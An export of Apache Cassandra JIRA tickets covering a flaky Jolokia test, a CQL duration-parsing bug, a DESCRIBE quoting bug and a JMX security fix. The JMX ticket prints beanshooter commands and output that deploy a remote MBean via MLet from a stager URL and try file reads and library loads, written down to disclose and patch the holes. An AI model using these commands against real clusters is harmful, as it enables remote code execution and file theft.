[https://ci-cassandra.apache.org/job/Cassandra-4.1/169/testReport/junit/dtest-novnode.auth_test/TestNetworkAuth/test_revoked_dc_access/]",,jmckenzie,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17932,,,,,,CASSANDRA-17892,CASSANDRA-17929,CASSANDRA-17926,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Availability,,,,,,,,Normal,DTest,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Oct 24 13:40:11 UTC 2022,,,,,,,All,,,,"0|z18ups:",9223372036854775807,,,,jmckenzie,,,,Normal,,NA,,https://github.com/apache/cassandra-dtest/commit/860d005f63f7a31dcdae234a24af605e279b6e75,,,,,,,,,run CI,,,,,"26/Sep/22 19:52;brandon.williams;I think this is only happening on Jenkins now.;;;","28/Sep/22 14:11;brandon.williams;Blocking this on CASSANDRA-17932, as I don't know how to measure success here without it.;;;","04/Oct/22 14:51;brandon.williams;I suggest we simply [add some retries|https://github.com/driftx/cassandra-dtest/tree/CASSANDRA-17922] which should [be safe|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1972/] in any case.;;;","06/Oct/22 16:01;jmckenzie;Do we know the source of the race that's leading to the port being in use? i.e. is there something underlying (non-deterministic timing on cluster setup / teardown / agent init / etc) that we could block on to get a bit more guarantee on this rather than sleeping?;;;","06/Oct/22 16:04;brandon.williams;It's not the port after CASSANDRA-17872, so it's down to some internal java agent thing.;;;","07/Oct/22 19:10;jmckenzie;bq. it's down to some internal java agent thing
1. Ew
2. /sad
3. Looks like the patch doesn't raise an exception anymore after complete failure to start the agent - was that intentional?;;;","07/Oct/22 19:16;brandon.williams;bq. /sad

And I've never been able to reproduce either of these issues.

bq. Looks like the patch doesn't raise an exception anymore

Nope, good catch, let me correct that.;;;","11/Oct/22 15:25;brandon.williams;Patch updated. [!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1993/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1993/pipeline]
;;;","11/Oct/22 20:35;jmckenzie;+1 if CI's clean;;;","12/Oct/22 14:32;brandon.williams;CI looks fine, but still has a couple of Jolokia errors(!)  I'm taking a look.;;;","13/Oct/22 15:42;brandon.williams;I changed all the prints to proper logging messages because Jenkins seems to eat the output, or at least I can't find it.  A [run|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1998/] with those changes have yielded [this|https://ci-cassandra.apache.org/job/Cassandra-devbranch-dtest-novnode/1304/label=cassandra-dtest,split=41/consoleFull] interesting bit:

{noformat}
19:11:42 00:11:42,241 tools.jmxutils INFO Port 8778 open for jolokia
19:11:44 00:11:43,956 tools.jmxutils WARNING Failed to start jolokia agent (command was: /usr/lib/jvm/java-8-openjdk-amd64/bin/java -cp /usr/lib/jvm/java-8-openjdk-amd64/lib/tools.jar:/home/cassandra/cassandra/cassandra-dtest/tools/../lib/jolokia-jvm-1.7.1-agent.jar org.jolokia.jvmagent.client.AgentLauncher --host 127.0.0.1 --port 8778 start 2190): Command '('/usr/lib/jvm/java-8-openjdk-amd64/bin/java', '-cp', '/usr/lib/jvm/java-8-openjdk-amd64/lib/tools.jar:/home/cassandra/cassandra/cassandra-dtest/tools/../lib/jolokia-jvm-1.7.1-agent.jar', 'org.jolokia.jvmagent.client.AgentLauncher', '--host', '127.0.0.1', '--port', '8778', 'start', '2190')' returned non-zero exit status 1.
19:11:44 00:11:43,957 tools.jmxutils WARNING Exit status was: 1
19:11:44 00:11:43,958 tools.jmxutils WARNING Output was: b""Couldn't start agent for PID 2190\nPossible reason could be that port '8778' is already occupied.\nPlease check the standard output of the target process for a detailed error message.\n""
19:11:46 00:11:46,546 tools.jmxutils WARNING Failed to start jolokia agent (command was: /usr/lib/jvm/java-8-openjdk-amd64/bin/java -cp /usr/lib/jvm/java-8-openjdk-amd64/lib/tools.jar:/home/cassandra/cassandra/cassandra-dtest/tools/../lib/jolokia-jvm-1.7.1-agent.jar org.jolokia.jvmagent.client.AgentLauncher --host 127.0.0.1 --port 8778 start 2190): Command '('/usr/lib/jvm/java-8-openjdk-amd64/bin/java', '-cp', '/usr/lib/jvm/java-8-openjdk-amd64/lib/tools.jar:/home/cassandra/cassandra/cassandra-dtest/tools/../lib/jolokia-jvm-1.7.1-agent.jar', 'org.jolokia.jvmagent.client.AgentLauncher', '--host', '127.0.0.1', '--port', '8778', 'start', '2190')' returned non-zero exit status 1.
19:11:46 00:11:46,547 tools.jmxutils WARNING Exit status was: 1
19:11:46 00:11:46,548 tools.jmxutils WARNING Output was: b'Jolokia is already attached to PID 2190\nhttp://127.0.0.1:8778/jolokia/\n'
19:11:49 FAILED
{noformat}

This seems to indicate these initial ""couldn't start agent"" failures are at least sometimes bogus, as jolokia was actually successful according to the second error.;;;","19/Oct/22 14:55;brandon.williams;I decided to accept the 'Jolokia is already attached' error as success and checked in [another run|https://ci-cassandra.apache.org/job/Cassandra-devbranch/2019/] but that had no Jolokia problems at all, so I'm trying again to catch a failure. [!https://ci-cassandra.apache.org/job/Cassandra-devbranch/2026/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/2027/pipeline]
;;;","20/Oct/22 16:13;brandon.williams;bq. I think this is only happening on Jenkins now.

I was (thankfully) wrong, [~edimitrova] hit the issue in circle [here|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1978/workflows/9fb7d630-a15d-4a72-813a-ee6c79b3e690/jobs/15715/tests#failed-test-0].  This is just more prevalent in Jenkins.;;;","24/Oct/22 00:42;brandon.williams;[Here|https://ci-cassandra.apache.org/job/Cassandra-devbranch/2042/] is a run with no Jolokia errors, and we can see [here|https://ci-cassandra.apache.org/job/Cassandra-devbranch-dtest-novnode/label=cassandra-dtest,split=12/1342/consoleFull]  the new code in action:

{noformat}
08:45:59 13:46:05,196 tools.jmxutils INFO Port 8778 open for jolokia
08:46:05 13:46:06,445 tools.jmxutils WARNING Failed to start jolokia agent (command was: /usr/lib/jvm/java-8-openjdk-amd64/bin/java -cp /usr/lib/jvm/java-8-openjdk-amd64/lib/tools.jar:/home/cassandra/cassandra/cassandra-dtest/tools/../lib/jolokia-jvm-1.7.1-agent.jar org.jolokia.jvmagent.client.AgentLauncher --host 127.0.0.1 --port 8778 start 14308): Command '('/usr/lib/jvm/java-8-openjdk-amd64/bin/java', '-cp', '/usr/lib/jvm/java-8-openjdk-amd64/lib/tools.jar:/home/cassandra/cassandra/cassandra-dtest/tools/../lib/jolokia-jvm-1.7.1-agent.jar', 'org.jolokia.jvmagent.client.AgentLauncher', '--host', '127.0.0.1', '--port', '8778', 'start', '14308')' returned non-zero exit status 1.
08:46:06 13:46:06,446 tools.jmxutils WARNING Exit status was: 1
08:46:06 13:46:06,447 tools.jmxutils WARNING Output was: Couldn't start agent for PID 14308
08:46:06 Possible reason could be that port '8778' is already occupied.
08:46:06 Please check the standard output of the target process for a detailed error message.
08:46:06 
08:46:06 13:46:08,822 tools.jmxutils INFO Jolokia reports being attached on try 1, returning successfully
08:46:08 13:46:09,304 tools.jmxutils INFO Port 8778 open for jolokia
08:46:09 13:46:10,471 tools.jmxutils INFO Jolokia successful on try 0
08:46:10 13:46:10,943 tools.jmxutils INFO Port 8778 open for jolokia
08:46:10 13:46:12,109 tools.jmxutils INFO Jolokia successful on try 0
08:46:12 PASSED13:46:12,648 ccm DEBUG Log-watching thread exiting.
{noformat};;;","24/Oct/22 13:32;jmckenzie;+1;;;","24/Oct/22 13:40;brandon.williams;Committed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Harden JMX by resolving beanshooter issues,CASSANDRA-17921,13483267,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,aratnofsky,mck,mck,26/Sep/22 19:20,23/Oct/22 21:08,13/Jul/23 08:40,18/Oct/22 21:27,3.0.28,3.11.14,4.0.7,4.1,4.1-rc1,5.0,Observability/JMX,,,,0,,"Fix JMX security vulnerabilities

As reported by Murray McAllister, there are multiple JMX vulnerabilities
in the default Cassandra configuration on 3.0, 3.11, 4.0 and trunk,
across Java 8 and Java 11. These are limited to authenticated JMX users
only.

Vulnerabilities:
1. (Java 8 and 11) Remote Java Library loading and execution via MLet
2. (Java 11 only) Remote Java file reads via DiagnosticCommandMBean's
   compilerDirectivesAdd implementation leaking arbitrary file contents
3. (Java 11 only) Remote .so library loading via JVMTI

qtc-de/beanshooter is a JMX enumeration tool that uses these mechanisms
and others:
https://github.com/qtc-de/beanshooter/blob/2ec4f7a4b44a29f52315973fe944eb34bc772063/beanshooter/src/de/qtc/beanshooter/mbean/diagnostic/Dispatcher.java#L48

Remote file reads via compilerDirectiveAdd does not appear to be
reproducible on Java 8 (cassandra-{3.0,3.11}, Java 1.8.0_345-b01 from
Adoptium / Temurin). Using qtc-de/beanshooter and cassandra-3.0
(a78db628):
{code}
$ java -jar target/beanshooter-3.0.0-jar-with-dependencies.jar diagnostic read --verbose 127.0.0.1 7199 /tmp/hello
[-] A method with signature compilerDirectivesAdd([Ljava.lang.String;) does not exist on the endpoint.
[-] If you invoked a deployed MBean, make sure that the correct version was deployed.
[-] Cannot continue from here.
{code}

Java 8 also appears to not be vulnerable to remote library loading:
{code}
$ java -jar target/beanshooter-3.0.0-jar-with-dependencies.jar diagnostic load --verbose 127.0.0.1 7199 /tmp/hello
[-] A method with signature jvmtiAgentLoad([Ljava.lang.String;) does not exist on the endpoint.
[-] If you invoked a deployed MBean, make sure that the correct version was deployed.
[-] Cannot continue from here.
{code}

But Java 8 does appear to be vulnerable to MLet:
{code}
$ java -jar target/beanshooter-3.0.0-jar-with-dependencies.jar tonka deploy --stager-url http://localhost:8000 127.0.0.1 7199
[+] Starting MBean deployment.
[+]
[+]     Deplyoing MBean: TonkaBean
[+]
[+]             MBean class is not known by the server.
[+]             Starting MBean deployment.
[+]
[+]                     Deplyoing MBean: MLet
[+]                     MBean with object name DefaultDomain:type=MLet was successfully deployed.
[+]
[+]             Loading MBean from http://localhost:8000
[+]
[+]                     Creating HTTP server on: localhost:8000
[+]                     Creating MLetHandler for endpoint: /
[+]                     Creating JarHandler for endpoint: /fb0f34fe7c4f456bb44c07d9650dbf1e
[+]                     Starting HTTP server.
[+]
[+]                     Incoming request from: localhost
[+]                     Requested resource: /
[+]                     Sending mlet:
[+]
[+]                             Class:     de.qtc.beanshooter.tonkabean.TonkaBean
[+]                             Archive:   fb0f34fe7c4f456bb44c07d9650dbf1e
[+]                             Object:    MLetTonkaBean:name=TonkaBean,id=1
[+]                             Codebase:  http://localhost:8000
[+]
[+]                     Incoming request from: localhost
[+]                     Requested resource: /fb0f34fe7c4f456bb44c07d9650dbf1e
[+]                     Sending jar file with md5sum: 39d35ebd20aee73fbb83928584a530d7
[+]
[+]     MBean with object name MLetTonkaBean:name=TonkaBean,id=1 was successfully deployed.
{code}

Java 11 appears to be vulnerable to all three vulnerabilities, using JDK
Adoptium / Temurin 11.0.16.1+1 and cassandra-4.0 (5beab63b).

This patch fixes the above issues by introducing a new system property:
`cassandra.jmx.security.profile`, which can be set to ""restrictive""
(default) or ""lax"". The restrictive profile blocks the mechanisms for
all three vulnerabilities, by introducing a JMX
MBeanServerAccessController. Users can use the lax profile if they
require these mechanisms, or use their own authorization proxy by
specifying `cassandra.jmx.authorizer`.",,e.dimitrova,mck,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,aratnofsky,,,,,,,,,,,,,,Security -> Privilege Escalation,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Oct 18 21:27:21 UTC 2022,,,,,,,All,,,,"0|z18uow:",9223372036854775807,,,,jmeredithco,mck,samt,,Low,,3.0 alpha 1,,https://github.com/apache/cassandra/commit/b2660bcf78ccf08a3a0ae39a8c9ffb397efef9ff,,,,,,,,,circleci and jenkins,,,,,"18/Oct/22 21:27;mck;Committed as [b2660bcf78ccf08a3a0ae39a8c9ffb397efef9ff|https://github.com/apache/cassandra/commit/b2660bcf78ccf08a3a0ae39a8c9ffb397efef9ff].;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Capital P gets confused in the parser for a Duration in places where IDENT are needed,CASSANDRA-17919,13482979,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,maximc,dcapwell,dcapwell,23/Sep/22 18:05,27/Apr/23 08:18,13/Jul/23 08:40,27/Apr/23 08:17,3.11.15,4.0.10,4.1.2,5.0,,,CQL/Syntax,,,,0,,"This was found while adding Accord Transaction syntax into CQL and fuzz testing to validate all possible cases… in doing this the following was found

{code}
String query = ""BEGIN TRANSACTION\n"" +
                           ""  LET P = (SELECT v FROM "" + keyspace + "".tbl WHERE k=? AND c=?);\n"" +
                           ""  LET row2 = (SELECT v FROM "" + keyspace + "".tbl WHERE k=? AND c=?);\n"" +
                           ""  SELECT v FROM "" + keyspace + "".tbl WHERE k=? AND c=?;\n"" +
                           ""  IF P IS NULL AND row2.v = ? THEN\n"" +
                           ""    INSERT INTO "" + keyspace + "".tbl (k, c, v) VALUES (?, ?, ?);\n"" +
                           ""  END IF\n"" +
                           ""COMMIT TRANSACTION"";
{code}

Fails with

{code}
SyntaxException: line 2:6 mismatched input 'P' expecting IDENT (BEGIN TRANSACTION  LET [P]...)
{code}

The new LET syntax found this, but was able to reproduce in other cases

{code}
cqlsh:ks> CREATE TABLE P (k INT PRIMARY KEY);
SyntaxException: line 1:13 no viable alternative at input 'P' (CREATE TABLE [P]...)
cqlsh:ks>
cqlsh:ks> CREATE TABLE p (k INT PRIMARY KEY);
cqlsh:ks>
{code}",,blerer,dcapwell,e.dimitrova,maximc,smiklosovic,,,,,,,,,,"maxim-chn opened a new pull request, #1974:
URL: https://github.com/apache/cassandra/pull/1974

   The description change is available at https://issues.apache.org/jira/browse/CASSANDRA-17919 patch submission, as it involves multiple versions.
   
   In short, I've fixed how `Lexer.g` recognizes 0 duration token in [ISO 8601](https://en.wikipedia.org/wiki/ISO_8601#Durations) format and updated unit tests to cover the change.
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)


;06/Nov/22 14:30;githubbot;600","maxim-chn closed pull request #1974: Fixed ISO 8601 format 0 duration parsing (#CASSANDRA-17919)
URL: https://github.com/apache/cassandra/pull/1974


;06/Nov/22 14:34;githubbot;600","maxim-chn opened a new pull request, #1975:
URL: https://github.com/apache/cassandra/pull/1975

   The description change is available at https://issues.apache.org/jira/browse/CASSANDRA-17919 patch submission, as it involves multiple versions.
   
   In short, I've fixed how `Lexer.g` recognizes 0 duration token in [ISO 8601](https://en.wikipedia.org/wiki/ISO_8601#Durations) format and updated unit tests to cover the change.
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)


;06/Nov/22 15:05;githubbot;600","maxim-chn opened a new pull request, #1976:
URL: https://github.com/apache/cassandra/pull/1976

   The change description is available at https://issues.apache.org/jira/browse/CASSANDRA-17919 patch submission, as it involves multiple versions.
   
   In short, I've fixed how `Lexer.g` recognizes 0 duration token in [ISO 8601](https://en.wikipedia.org/wiki/ISO_8601#Durations) format and updated unit tests to cover the change.
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   


;06/Nov/22 15:10;githubbot;600","maxim-chn opened a new pull request, #1977:
URL: https://github.com/apache/cassandra/pull/1977

   The change description is available at https://issues.apache.org/jira/browse/CASSANDRA-17919 patch submission, as it involves multiple versions.
   
   In short, I've fixed how `Lexer.g` recognizes 0 duration token in [ISO 8601](https://en.wikipedia.org/wiki/ISO_8601#Durations) format and updated unit tests to cover the change.
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   


;06/Nov/22 15:31;githubbot;600","maxim-chn opened a new pull request, #2283:
URL: https://github.com/apache/cassandra/pull/2283

   The change description is available at https://issues.apache.org/jira/browse/CASSANDRA-17919 patch submission, as it involves multiple versions.
   
   In short, I've fixed how Lexer.g recognizes 0 duration token in [ISO 8601](https://en.wikipedia.org/wiki/ISO_8601#Durations) format and updated unit tests to cover the change.
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)


;19/Apr/23 06:35;githubbot;600","smiklosovic closed pull request #1975: Fixed ISO 8601 format 0 duration parsing (#CASSANDRA-17919)
URL: https://github.com/apache/cassandra/pull/1975


;27/Apr/23 08:18;githubbot;600","smiklosovic closed pull request #1976: Fixed ISO 8601 format 0 duration parsing (#CASSANDRA-17919)
URL: https://github.com/apache/cassandra/pull/1976


;27/Apr/23 08:18;githubbot;600","smiklosovic closed pull request #1977: Fixed ISO 8601 format 0 duration parsing (#CASSANDRA-17919)
URL: https://github.com/apache/cassandra/pull/1977


;27/Apr/23 08:18;githubbot;600","smiklosovic closed pull request #2283: Fixed ISO 8601 format 0 duration parsing. (#CASSANDRA-17919)
URL: https://github.com/apache/cassandra/pull/2283


;27/Apr/23 08:18;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,6000,,,0,6000,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,maximc,,,,,,,,,,,,,,Correctness -> API / Semantic Definition,,,,,,,,Low Hanging Fruit,Fuzz Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Apr 27 07:53:36 UTC 2023,,,,,,,All,,,,"0|z18sy8:",9223372036854775807,,,,blerer,smiklosovic,,,Normal,,3.10,,https://github.com/apache/cassandra/commit/0f3a990dd2bc9532752a711a49a131c63d52e3c7,,,,,,,,,"*Pull requests*
 * cassandra-3.11 - [https://github.com/apache/cassandra/pull/1977]
 * cassandra-4.0 - [https://github.com/apache/cassandra/pull/1975]
 * cassandra-4.1 - [https://github.com/apache/cassandra/pull/1976]
 * trunk - [https://github.com/apache/cassandra/pull/2283]

*Source code changes*
There was a change in the Lexer.g.
Capital letter ""P"" is no longer a valid representation for 0 duration. It has to comply with [https://en.wikipedia.org/wiki/ISO_8601#Durations] (see Benjamin Lerer's comment).
A couple of examples for valid 0 duration representation are:
{code:java}
PT0S
P0D
PT0H
P0W
P0Y0M0DT0H0M0S
{code}
*Unit tests changes*
The following tests have been expanded with new logic to cover the ticket's changes:
 * org.apache.cassandra.cql3.validation.operations.CreateTest
 * org.apache.cassandra.cql3.validation.operations.DropTest
 * org.apache.cassandra.cql3.validation.operations.InsertTest

*Manual test case flow*
Let's go through the case where we create a ""P"" keyspace, use it, create a ""P"" table and insert 0 duration twice with the correct format (the updated), select all rows, try to insert 0 duration with incorrect format, get the error and lastly drop the ""P"" keyspace.
{code:java}
cqlsh> CREATE KEYSPACE IF NOT EXISTS P WITH replication = {'class': 'SimpleStrategy', 'replication_factor': '1'};

cqlsh> USE P;

cqlsh:p> CREATE TABLE P (a INT PRIMARY KEY, b DURATION);

cqlsh:p> INSERT INTO P (a, b) VALUES (1, PT0S);
cqlsh:p> INSERT INTO P (a, b) VALUES (2, P0D);

cqlsh:p> SELECT * FROM P;

 a | b
---+---
 1 |  
 2 |  

(2 rows)

cqlsh:p> INSERT INTO P (a, b) VALUES (3, P);
SyntaxException: line 1:33 no viable alternative at input ')' (... b) VALUES (3, [P])...)

cqlsh:p> DROP KEYSPACE P;

cqlsh:p> describe keyspaces;

system       system_distributed  system_traces  system_virtual_schema
system_auth  system_schema       system_views {code}",,smiklosovic,,,"23/Sep/22 18:06;dcapwell;In further inspection ""PT"" is also unsafe as it hits the same bug.

Caleb also tested the following and we found that ""P"" is a valid duration

{code}
assertEquals(Duration.newInstance(0, 0, 0), Duration.from(""P""));
{code};;;","26/Sep/22 12:38;blerer;According to [Wikipedia|https://en.wikipedia.org/wiki/ISO_8601#Durations]:
{quote}Date and time elements including their designator may be omitted if their value is zero, and lower-order elements may also be omitted for reduced precision. For example, ""P23DT23H"" and ""P4Y"" are both acceptable duration representations. However, at least one element must be present, thus ""P"" is not a valid representation for a duration of 0 seconds. ""PT0S"" or ""P0D"", however, are both valid and represent the same duration.
{quote}
Effectively the lexer rule and the parsing logic from {{Duration.from}} should be rewritten.;;;","27/Oct/22 09:40;maximc;[~dcapwell] , [~blerer] Hello! I'd like to work on the issue.
I will assign myself - so please remove me if it is already taken. I'll watch the ticket updates' mail.

+What has been done so far?+

I've checked out a branch from Cassandra 4.1, created a couple of unit tests that fail because of ""DROP TABLE P"" and ""CREATE TABLE P"" with the same error as in the bug report. In short - there is a functioning local dev environment to test out code changes.

I'd like to go with [~blerer]'s solution.

I've tried other options, like placing token IDENT above DURATION or trying to identify P as duration only when it's enclosed by parentheses ().
None of them worked either because of the ambiguity where both IDENT and DURATION contain a letter and optional digit or too complicated code wise.
And given the thousands of code lines in parser logic - more complication is the last thing that is needed :D;;;","27/Oct/22 13:03;blerer;@[~maximc]  Thanks for working on this problem. :-) 
The Duration type was introduced in 3.10 and the bug was there from the start. You should probably start with the 3.11 branch. The merge should be relatively simple. ;;;","06/Nov/22 15:52;maximc;[~dcapwell] [~blerer] hello!

I've submitted the patch with the pull requests for the relevant versions.;;;","12/Apr/23 15:38;smiklosovic;Any progress here? I think I will do a review if nothing has changed since then.;;;","13/Apr/23 13:32;maximc;[~smiklosovic] , it would be great if you can do a review! There was no change since patches submission.;;;","17/Apr/23 12:25;smiklosovic;[~maximc] could you please prepare patch for trunk as well? 

It would be great if all of them are rebased on top of the current branches as it was quite a while this was implemented. 

Could  you also please put a comment for these tests that it is testing CASSANDRA-17919? People might be quite confused while looking on test which tests the creation of a table called ""P"".;;;","18/Apr/23 05:59;maximc;[~smiklosovic], sure. I'll update once done.;;;","19/Apr/23 06:44;maximc;[~smiklosovic],
* I've added the comment to hint the test cases' purpose.
* Pull request to trunk was created. I've attached link to it under ""Pull requests"" under the section ""Test and Documentation Plan"" (along with the existing pull requests).
* All the branches have been rebased to contain the latest commits of the target branches.;;;","19/Apr/23 14:10;smiklosovic;Thanks.

It looks just fine. I noticed there there is also this in the wiki

_The smallest value used may also have a decimal fraction,[38] as in ""P0.5Y"" to indicate half a year. This decimal fraction may be specified with either a comma or a full stop, as in ""P0,5Y"" or ""P0.5Y""._

We do not implement this. This ticket is not to blame, I am just writing what I see. I looked into the code and it would be quite challenging to support this format. The values are based on an integer only. 

I am +1, I need to find another committer and we may build it all afterwards as it spans 4 branches.

The sneak peek of the builds is here, for trunk j8 pre-commit, I will build the rest afterwards to save the resources and time: https://app.circleci.com/pipelines/github/instaclustr/cassandra/2105/workflows/c50c15aa-8e27-4fd6-b4cc-5a216ed115d6

[~dcapwell] [~e.dimitrova] [~blerer] [~brandon.williams]

;;;","26/Apr/23 08:51;blerer;The patches look good to me. Thanks [~maximc];;;","26/Apr/23 21:23;smiklosovic;3.11 https://app.circleci.com/pipelines/github/instaclustr/cassandra/2144/workflows/c55dd33e-341b-4cfc-b1c1-1348de9da4cf

all failed tests in Butler:

test_dead_sync_initiator
testReprepareMixedVersionWithoutReset

4.0 https://app.circleci.com/pipelines/github/instaclustr/cassandra/2143/workflows/edd00ec9-2230-4faf-ac40-b10ef360b596

all failed tests in Butler:

testExpireSome
testFailingMessage

4.1 https://app.circleci.com/pipelines/github/instaclustr/cassandra/2142/workflows/96a0e62d-64a6-49e2-ae4e-1d3da38be742

tests in Butler:

paxosRepairHistoryIsntUpdatedInForcedRepair
testServiceTopPartitionsSingleTable

ShortPaxosSimulationTest - this is not in Butler but it does not seem to be related at all

trunk https://app.circleci.com/pipelines/github/instaclustr/cassandra/2105/workflows/c50c15aa-8e27-4fd6-b4cc-5a216ed115d6

in Butler:

testMessageDeliveryOnReconnect

[~blerer] do you want to take additional look and +1 that? I see just usual flakes. I am +1 myself.;;;","27/Apr/23 07:53;blerer;+1 :-) ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
DESCRIBE output does not quote column names using reserved keywords,CASSANDRA-17918,13482820,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,smiklosovic,yifanc,yifanc,22/Sep/22 19:55,11/May/23 16:07,13/Jul/23 08:40,11/May/23 14:16,4.0.10,4.1.2,5.0,,,,Legacy/CQL,,,,0,,"The DESCRIBE output of the column names that using reserved keywords are not quoted for UDTs. The following test reproduces. Reading the code, it looks like that the such columns names are not quoted in materialized view, UDF and user defined aggregation. 
The impact of the bug is that schema described cannot be imported due to the usage of reserved keywords as column names. 
 
{code:java}
    @Test
    public void testUsingReservedInCreateType() throws Throwable
    {
        String type = createType(KEYSPACE_PER_TEST, ""CREATE TYPE %s (\""token\"" text, \""desc\"" text);"");               assertRowsNet(executeDescribeNet(KEYSPACE_PER_TEST, ""DESCRIBE TYPE "" + type),
                row(KEYSPACE_PER_TEST, ""type"", type, ""CREATE TYPE "" + KEYSPACE_PER_TEST + ""."" + type + "" (\n"" +
                        ""    \""token\"" text,\n"" +
                        ""    \""desc\"" text\n"" +
                        "");""));
    } {code}
+Additional information for newcomers:+
 * Unit tests for DESCRIBE statements are in {{DescribeStatementTest}}
 * The statement implementation is in {{DescribeStatement and fetch the create statement from the different schema element using  SchemaElement.toCqlString}}",,bernardo.botella,blerer,smiklosovic,yifanc,,,,,,,,,,,"smiklosovic opened a new pull request, #2315:
URL: https://github.com/apache/cassandra/pull/2315

   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;09/May/23 05:58;githubbot;600","smiklosovic opened a new pull request, #2316:
URL: https://github.com/apache/cassandra/pull/2316

   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;09/May/23 06:00;githubbot;600","smiklosovic closed pull request #2308: CASSANDRA-17918 trunk
URL: https://github.com/apache/cassandra/pull/2308


;11/May/23 14:18;githubbot;600","smiklosovic closed pull request #2315: CASSANDRA-17918 4.1
URL: https://github.com/apache/cassandra/pull/2315


;11/May/23 14:18;githubbot;600","smiklosovic closed pull request #2316: CASSANDRA-17918 4.0
URL: https://github.com/apache/cassandra/pull/2316


